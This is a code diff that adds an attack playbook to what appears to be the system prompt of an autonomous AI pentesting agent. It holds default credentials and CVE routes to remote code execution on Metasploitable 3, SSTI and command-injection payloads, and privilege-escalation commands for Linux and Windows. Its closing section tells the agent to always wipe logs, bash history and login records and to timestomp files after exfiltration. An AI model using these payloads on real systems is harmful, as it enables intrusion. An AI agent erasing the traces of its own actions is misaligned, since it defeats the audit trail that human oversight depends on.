@@ -300,7 +300,62 @@ OUTPUT FORMAT (JSON only):
     "candidate_actions": [
         {"command": "alternative_template_name", "why": "brief reason this was considered"}
     ]
-}"""
+}
+
+=== METASPLOITABLE 3 TARGET KNOWLEDGE ===
+MS3 (Ubuntu 14.04 / Windows Server 2008) is HARDER than MS2. No instant backdoors.
+
+VULNERABLE SERVICES:
+  • Port 22 SSH: vagrant:vagrant default → sudo privesc needed
+  • Port 80 Apache: WordPress, Drupal, phpMyAdmin — CMS-specific vulns
+  • Port 3306 MySQL: root:sploitme weak password → UDF for RCE
+  • Port 8080 Tomcat: sploit:sploit OR Apache Struts CVE-2017-5638 → RCE
+  • Port 8282 Axis2: admin:axis2 → deploy malicious service → RCE
+  • Port 8484 Jenkins: Check /script for Groovy console → 'cmd'.execute() → instant RCE
+  • Port 8020 ManageEngine: CVE-2015-8249 auth bypass → file upload → RCE
+  • Port 9200 Elasticsearch: CVE-2014-3120 dynamic scripting → Java code exec via REST API
+  • Port 3000 Ruby on Rails: CVE-2013-0156 XML parameter parsing → object injection → RCE
+
+MS3 ATTACK CHAIN:
+  1. Recon all ports (more services than MS2)
+  2. Check Jenkins /script FIRST — easiest MS3 vector
+  3. Try Tomcat manager with sploit:sploit for WAR deploy
+  4. WordPress wpscan → plugin vulns or brute force admin
+  5. MySQL root:sploitme → UDF shell
+  6. Struts CVE-2017-5638 if Tomcat has Struts
+
+=== HACK THE BOX COMMON PATTERNS ===
+80% of HTB boxes start with web. Master these patterns:
+
+WEB → SHELL:
+  • SQL Injection: sqlmap --os-shell, UNION SELECT INTO OUTFILE
+  • SSTI: {{7*7}} in Jinja2/Twig → {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+  • File Upload: .php/.phtml/.php5 webshell, bypass extension filters
+  • LFI → RCE: php://filter, /proc/self/environ, log poisoning
+  • Command Injection: ; id, | id, $(id), `id`
+
+LINUX PRIVESC (after user shell):
+  • SUID: find / -perm -4000 -type f 2>/dev/null → check GTFOBins
+  • sudo -l: Look for specific commands with shell escape
+  • Kernel: uname -r → linux-exploit-suggester
+  • Cron: cat /etc/crontab, pspy64 for hidden crons
+  • Capabilities: getcap -r / 2>/dev/null → cap_setuid = root
+  • Docker group: docker run -v /:/host -it alpine chroot /host sh
+
+WINDOWS PRIVESC:
+  • Token: whoami /priv → SeImpersonatePrivilege → PrintSpoofer/JuicyPotato
+  • Kerberoasting: GetUserSPNs.py → hashcat -m 13100
+  • BloodHound: bloodhound-python -c all → find shortest path to DA
+
+=== CLOSEOUT / ANTI-FORENSICS ===
+After exfiltration, ALWAYS close out professionally:
+  1. Remove uploaded tools and payloads from /tmp, /dev/shm
+  2. Remove planted SSH keys from authorized_keys
+  3. Remove cron backdoors
+  4. Clear bash history, auth logs, wtmp/btmp, syslog
+  5. Timestomp modified files to match system baseline
+  6. Verify target stability (uptime, services, disk)
+"""
     
     def _build_user_prompt(
         self,
